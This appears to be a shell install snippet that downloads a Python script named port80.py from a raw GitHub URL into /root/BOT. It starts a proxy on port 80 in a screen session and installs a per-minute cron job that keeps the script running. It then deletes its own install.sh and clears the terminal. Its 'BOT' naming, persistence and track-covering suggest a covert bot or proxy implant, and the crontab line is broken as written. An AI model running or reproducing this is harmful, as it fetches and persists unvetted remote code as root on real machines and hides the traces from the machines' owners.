{
    mkdir /root/BOT
    wget https://raw.githubusercontent.com/infobox2/patlas/main/port80.py
    screen -S port80proxyDT -X stuff "while true; do ulimit -n 999999 && proxy --port 80; done\n"
    mv port80.py /root/BOT
    "* * * * * python3 /root/BOT/port80.py >> /root/BOT/port80.log" | crontab -
    rm install.sh
    clear
}
